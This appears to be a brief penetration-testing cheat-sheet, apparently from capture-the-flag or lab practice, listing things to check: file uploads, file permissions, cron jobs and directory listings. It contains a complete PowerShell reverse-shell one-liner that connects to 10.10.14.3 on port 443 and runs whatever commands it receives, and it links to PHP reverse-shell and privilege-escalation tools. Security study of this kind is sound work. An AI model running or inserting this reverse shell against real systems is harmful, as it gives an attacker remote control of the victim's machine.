# MISC

Things to inspect

- **upload file** for possible reverse shell attack 

    current known script to reverse shell:
    - xp_cmdshell

    ```
    $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    ```
    - php, [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- **file permission** to escalate previlege
    
    scan with [linepeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

- **unususal process** such as cron to do something (curl, wget) 

- **ls -la**

    always `ls -la` to inspect folder/file thoroughly